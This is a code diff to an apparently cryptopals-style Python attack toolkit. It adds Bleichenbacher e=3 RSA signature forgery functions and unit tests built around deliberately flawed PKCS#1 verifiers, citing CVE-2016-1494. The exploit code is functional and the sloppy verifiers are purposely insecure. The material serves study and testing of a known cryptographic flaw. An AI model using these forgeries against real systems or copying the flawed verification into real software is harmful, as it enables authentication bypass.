@@ -35,6 +35,7 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 from operator import mul
 from urllib import unquote
+from gmpy2 import iroot
 
 # Utils {{{
 def b64d(s):
@@ -1128,8 +1129,6 @@ def decrypt_rsa(privkey, msg):
     return pow(msg, d, n)
 
 def rsa_broadcast_attack(pairs, exponent=3):
-  from gmpy2 import iroot
-
   ns = [n for n, c in pairs]
   cs = [c for n, c in pairs]
 
@@ -1144,14 +1143,11 @@ def rsa_broadcast_attack(pairs, exponent=3):
     res += c * m * inverse(m, n)
 
   res %= N
-
   rec, _ = iroot(res, exponent)
 
   return long_to_bytes(rec)
 
 def rsa_unpadded_message_attack(ct, modulus, exponent=3):
-  from gmpy2 import iroot
-
   while True:
     rec, e = iroot(ct, exponent)
     if e:
@@ -1162,7 +1158,6 @@ def rsa_unpadded_message_attack(ct, modulus, exponent=3):
   return long_to_bytes(rec)
 
 def rsa_unpadded_decryption_oracle(decryption_oracle, pubkey, ct):
-
   N, e = pubkey
 
   pt2 = 42 # random.randrange(1, N)
@@ -1171,6 +1166,41 @@ def rsa_unpadded_decryption_oracle(decryption_oracle, pubkey, ct):
 
   pt = (pt3 * invmod(pt2, N)) % N
   return long_to_bytes(pt)
+
+ASN1_SHA1 = '\x30\x21\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05\x00\x04\x14'
+
+def rsa_bleichenbacher_e3_signature_forgery(msg):
+  modlen = 1024 / 8 # attack for a 1024-bit modulus
+
+  block = '\x00\x01\xff\x00' + ASN1_SHA1 + hashlib.sha1(msg).digest()
+  block += '\x7f' * (modlen - 4 - len(ASN1_SHA1) - 20) # right-pad to approx half the interval
+
+  sig, _ = iroot(bytes_to_long(block), 3)
+  return long_to_bytes(sig)
+
+def rsa_bleichenbacher_e3_signature_forgery_easy(msg, modulus_size=1024):
+  '''using easy suffix computation '''
+  '''https://blog.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/ '''
+  '''https://grocid.net/2016/06/05/backdoorctf16-baby/'''
+
+  suffix = '\x00' + ASN1_SHA1 + hashlib.sha1(msg).digest()
+
+  assert bytes_to_long(suffix) % 2 == 1 # easy suffix computation only works with odd target
+  sig_suffix = 1
+
+  for b in range(len(suffix) * 8):
+    if get_bit(sig_suffix ** 3, b) != get_bit(bytes_to_long(suffix), b):
+      sig_suffix = set_bit(sig_suffix, b, 1)
+
+  assert long_to_bytes(sig_suffix ** 3).endswith(suffix)
+
+  while True:
+    prefix = '\x00\x01' + random_bytes(modulus_size / 8 - 2)
+    sig_prefix, _ = iroot(bytes_to_long(prefix), 3)
+    sig = long_to_bytes(sig_prefix)[:-len(suffix)] + long_to_bytes(sig_suffix)
+
+    if '\x00' not in long_to_bytes(bytes_to_long(sig) ** 3)[:-len(suffix)]:
+      return sig
 
 # }}}
 
@@ -1769,6 +1799,63 @@ class Tests(unittest.TestCase):
 
     rec = rsa_unpadded_decryption_oracle(decrypt_once, pubkey, ct)
     self.assertTrue(rec == msg)
+
+  def test_rsa_bleichenbacher_e3_signature_forgery(self):
+    '''https://cryptopals.com/sets/6/challenges/42 '''
+    '''OpenSSL and NSS used to be vulnerable, this attack broke Firefox's TLS certificate validation several years ago'''
+
+    def pkcs1_sign(msg):
+      h = hashlib.sha1(msg).digest()
+      npad = modlen - 2 - 1 - len(ASN1_SHA1 + h)
+      block = '\x00\x01' + ('\xff' * npad) + '\x00' + ASN1_SHA1 + h
+
+      return long_to_bytes(decrypt_rsa((n, d), bytes_to_long(block)))
+
+    def pkcs1_verify_bad(msg, sig):
+      cube = long_to_bytes(encrypt_rsa((n, 3), bytes_to_long(sig)))
+
+      if cube[:2] != '\x01\xff':
+        return False
+
+      return '\x00' + ASN1_SHA1 + hashlib.sha1(msg).digest() in cube
+
+    modlen = 1024 / 8
+
+    for msg_size in range(50):
+      _, (n, d) = keygen_rsa(1024, 3)
+      msg = random_chars(msg_size)
+
+      sig_legit = pkcs1_sign(msg)
+      sig_forged = rsa_bleichenbacher_e3_signature_forgery(msg)
+
+      self.assertTrue(pkcs1_verify_bad(msg, sig_legit))
+      self.assertTrue(pkcs1_verify_bad(msg, sig_forged))
+
+  def test_rsa_bleichenbacher_e3_signature_forgery_easy(self):
+    '''python-rsa CVE-2016-1494'''
+
+    def pkcs1_verify_bad(msg, sig):
+      cube = long_to_bytes(bytes_to_long(sig) ** 3)
+
+      if cube[0] != '\x01':
+        return False
+
+      if cube[-36:] != '\x00' + ASN1_SHA1 + hashlib.sha1(msg).digest():
+        return False
+
+      return True
+
+    def random_msg():
+      while True:
+        msg = random_chars(10)
+        if bytes_to_long(hashlib.sha1(msg).digest()) % 2 == 0:
+          continue
+        return msg
+
+    msg = random_msg()
+    sig = rsa_bleichenbacher_e3_signature_forgery_easy(msg)
+
+    self.assertTrue(pkcs1_verify_bad(msg, sig))
 
   # }}}
 
